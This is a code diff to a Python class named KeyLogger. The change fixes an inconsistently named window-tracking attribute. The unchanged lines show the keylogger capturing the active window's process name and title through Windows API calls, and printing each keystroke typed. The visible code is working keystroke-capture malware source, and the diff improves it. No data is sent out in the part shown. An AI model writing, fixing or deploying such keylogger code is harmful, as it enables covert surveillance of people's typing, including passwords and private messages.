@@ -19,7 +19,7 @@ class KeyLogger:
 
     def __init__(self):
     
-        self.currentWindows = None
+        self.currentWindow = None
         
     def getCurrentProcess(self):
     
@@ -33,8 +33,9 @@ class KeyLogger:
         windll.psapi.GetModuleBaseNameA(hProcess, None, byref(executable), 512)
         windowTitle = create_string_buffer(512)
         windll.user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
+        
         try:
-            self.current_window = windowTitle.value.decode()
+            self.currentWindow = windowTitle.value.decode()
         except UnicodeDecodeError as e:
             print(f'{e}: window name unknown')
         
@@ -45,7 +46,7 @@ class KeyLogger:
     
     def keystroke(self, event):
     
-        if event.WindowName != self.current_window:
+        if event.WindowName != self.currentWindow:
             self.getCurrentProcess()
         if 32 < event.Ascii < 127:
             print(chr(event.Ascii), end='')
